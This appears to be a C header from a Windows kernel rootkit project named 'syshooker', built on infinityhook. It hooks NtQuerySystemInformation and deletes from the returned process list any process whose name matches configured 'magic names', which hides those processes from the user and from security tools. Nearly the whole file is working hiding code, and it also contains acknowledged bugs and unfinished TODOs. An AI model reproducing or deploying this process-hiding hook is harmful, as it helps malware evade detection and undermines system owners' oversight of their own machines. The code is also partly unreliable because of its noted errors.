#pragma once
#include "Settings.h"

// macro source: https://stackoverflow.com/questions/3437404/min-and-max-in-c
#define MIN(a,b) (((a)<(b))?(a):(b))

// source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    CHAR Reserved1[48]; // was BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;

ULONG GetLastEntrySize(ULONG ReturnLength, SYSTEM_PROCESS_INFORMATION* CurrentEntry) {
	ULONG AllEntriesSum = 0;
	while (CurrentEntry->NextEntryOffset != 0) {
		AllEntriesSum += CurrentEntry->NextEntryOffset;
		CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)CurrentEntry + CurrentEntry->NextEntryOffset); // move forward
	}
	ULONG LastEntrySize = ReturnLength - AllEntriesSum;
	kprintf("[+] syshooker: AllEntriesSum %d, LastEntrySize %d\n", AllEntriesSum, LastEntrySize);
	return LastEntrySize;
}

NTSTATUS DetourNtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength)
{
	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {		
		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
		kprintf("[+] infinityhook: NtQuerySystemInformation: returnLength: %d\n", *ReturnLength);

        SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        if (ProcessInformationPtr) {
			ULONG LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
            while (1) {
                //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
                WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
                kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws, NextEntryOffset: %d, struct size: %d\n", ProcessNameBuffer, ProcessInformationPtr->NextEntryOffset, sizeof(SYSTEM_PROCESS_INFORMATION));

				//if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
					//kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
				//}

				// original check - uncomment to go back
				// if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
					// Not the last one
					if (ProcessInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						SYSTEM_PROCESS_INFORMATION* TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
						ULONG ProcessInformationBufferSizeToEnd = 0;
						while (TempProcessInformationPtr->NextEntryOffset != 0) {
							ProcessInformationBufferSizeToEnd += TempProcessInformationPtr->NextEntryOffset;
							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size
						ProcessInformationBufferSizeToEnd += LastEntrySize;

						// next structure address - start copying from there
						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);

						memcpy(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[-] syshooker: do we ever hit this?");
						// set previous NextEntryOffset to 0
						PreviousProcessInformationPtr->NextEntryOffset = 0;

						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
						// erease this FileInformation structure
						memset(ProcessInformationPtr, 0, LastEntrySize);
						break;
					}
				}

                if (ProcessInformationPtr->NextEntryOffset == 0) break;
                ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
            }
        }
	}
	
	// TODO - decrease ReturnLength - we may have removed some data
	return OriginalStatus;
}